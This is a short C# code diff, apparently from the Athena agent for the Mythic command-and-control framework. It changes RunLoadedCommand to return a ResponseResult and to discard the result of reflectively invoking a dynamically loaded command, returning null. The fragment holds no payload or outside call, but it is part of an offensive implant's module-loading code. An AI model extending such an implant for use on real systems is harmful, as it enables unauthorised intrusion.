@@ -275,7 +275,7 @@ namespace Athena.Commands
         /// Run a previously loaded command
         /// </summary>
         /// <param name="job">MythicJob containing the assembly</param>
-        public async Task<object> RunLoadedCommand(MythicJob job)
+        public async Task<ResponseResult> RunLoadedCommand(MythicJob job)
         {
             try
             {
@@ -284,7 +284,8 @@ namespace Athena.Commands
                 Dictionary<string, object> parameters = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters) ?? new Dictionary<string,object>();
                 parameters.Add("task-id", job.task.id);
 
-                return methodInfo.Invoke(null, new object[] { parameters });
+                methodInfo.Invoke(null, new object[] { parameters });
+                return null;
             }
             catch (Exception e)
             {
